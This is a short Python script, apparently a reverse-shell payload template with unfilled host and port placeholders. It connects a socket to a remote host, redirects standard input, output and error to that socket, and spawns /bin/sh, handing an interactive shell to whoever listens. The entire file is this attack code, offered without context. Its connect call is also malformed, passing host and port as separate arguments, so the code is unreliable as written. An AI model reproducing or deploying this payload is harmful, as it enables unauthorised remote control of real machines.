import sys,socket,os,pty

s=socket.socket()
s.connect("$$prueba$$",$$$RPORT$$)
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")
